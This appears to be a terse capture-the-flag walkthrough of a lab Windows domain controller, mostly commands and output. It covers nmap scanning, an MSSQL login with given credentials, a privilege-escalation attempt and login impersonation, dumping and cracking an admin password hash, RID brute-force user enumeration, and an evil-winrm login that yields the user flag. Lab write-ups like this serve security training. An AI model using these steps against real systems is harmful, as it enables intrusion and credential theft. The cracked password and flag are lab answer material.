##Nmap
```
nmap -sV -A 10.129.9.178
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-03 06:51 CST
Nmap scan report for 10.129.9.178
Host is up (0.36s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
| ms-sql-info: 
|   10.129.9.178:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-03-03T19:49:20
|_Not valid after:  2056-03-03T19:49:20
| ms-sql-ntlm-info: 
|   10.129.9.178:1433: 
|     Target_Name: EIGHTEEN
|     NetBIOS_Domain_Name: EIGHTEEN
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: eighteen.htb
|     DNS_Computer_Name: DC01.eighteen.htb
|     DNS_Tree_Name: eighteen.htb
|_    Product_Version: 10.0.26100
|_ssl-date: 2026-03-03T19:52:02+00:00; +7h00m00s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (86%)
Aggressive OS guesses: Microsoft Windows Server 2022 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   388.23 ms 10.10.16.1
2   388.30 ms 10.129.9.178

```

Login to the mssql

```
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@10.129.9.178

SELECT * FROM master.sys.syslogins;

Loged into the appdev using Imprsinate

CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'appdev','sysadmin'

```
```
SQL (kevin  guest@master)> SELECT * FROM master.sys.syslogins;
                                sid   status   createdate   updatedate      accdate   totcpu   totio   spacelimit   timelimit   resultlimit   name     dbname   password   language     denylogin   hasaccess   isntname   isntgroup   isntuser   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   ##MS_ServerStateReader##   ##MS_ServerStateManager##   ##MS_DefinitionReader##   ##MS_DatabaseConnector##   ##MS_DatabaseManager##   ##MS_LoginManager##   ##MS_SecurityDefinitionReader##   ##MS_PermissionDefinitionReader##   ##MS_ServerSecurityStateReader##   ##MS_ServerPermissionStateReader##   loginname   
-----------------------------------   ------   ----------   ----------   ----------   ------   -----   ----------   ---------   -----------   ------   ------   --------   ----------   ---------   ---------   --------   ---------   --------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   ------------------------   -------------------------   -----------------------   ------------------------   ----------------------   -------------------   -------------------------------   ---------------------------------   --------------------------------   ----------------------------------   ---------   
                              b'01'        9   2003-04-08 09:10:35   2025-09-12 01:32:38   2003-04-08 09:10:35        0       0            0           0             0   sa       master   NULL       us_english           0           1          0           0          0          1               0             0            0              0           0           0           0                          0                           0                         0                          0                        0                     0                                 0                                   0                                  0                                    0   sa          

b'9c5c3096c3dfc8458e31cbfcaa0b6a65'        9   2025-09-12 01:38:48   2025-09-12 01:38:48   2025-09-12 01:38:48        0       0            0           0             0   kevin    master   NULL       us_english           0           1          0           0          0          0               0             0            0              0           0           0           0                          0                           0                         0                          0                        0                     0                                 0                                   0                                  0                                    0   kevin       

b'2db95bab7f6f5547ae808360dcaddaba'        9   2025-09-12 01:38:53   2025-09-12 01:38:53   2025-09-12 01:38:53        0       0            0           0             0   appdev   master   NULL       us_english           0           1          0           0          0          0               0             0            0              0           0           0           0                          0                           0                         0                          0                        0                     0                                 0                                   0                                  0                                    0   appdev      

SQL (kevin  guest@master)> SELECT suser_sname(owner_sid) FROM sys.databases
     
--   
sa   

sa   

sa   

sa   

sa   

SQL (kevin  guest@master)> CREATE PROCEDURE sp_elevate_me WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'appdev','sysadmin'
ERROR(DC01): Line 1: CREATE PROCEDURE permission denied in database 'master'.
SQL (kevin  guest@master)> EXECUTE AS LOGIN = 'appdev' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
````

##Getting the admin password 

```
SQL (appdev  appdev@financial_planner)> SELECT * FROM users;
  id   full_name   username   email                password_hash                                                                                            is_admin   created_at   
----   ---------   --------   ------------------   ------------------------------------------------------------------------------------------------------   --------   ----------   
1002   admin       admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133          1   2025-10-29 05:39:03   

```

Cracking the password using the PBKDF2-SHA256 Cracker

```
git clone https://github.com/brunosergi/pbkdf2-sha256-cracker.git
python main.py --salt AMtzteQIG7yAbZIa --hash 0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133 --wordlist /usr/share/wordlists/rockyou.txt 


Cracking:   0%|                                                                                                                                  | 132/14344392 [00:04<150:44:17, 26.43pass/s]
2026-03-03 07:56:46 | SUCCESS  | Password found: iloveyou1
```

##User Enumeration via RID Brute Force

```
nxc mssql 10.129.9.178 -u kevin -p iNa2we6haRj2gaw! --local-auth --rid-brute

List 

bob.brown
carol.white
dave.green
jamie.dunn
jane.smith
alice.jones
adam.scott
```

##Evil-winrm

```

evil-winrm -u adam.scott -p iloveyou1 -i 10.129.9.178

LOcal user.txt

5c5c9f00a3559792ad1137462b120ad1

```

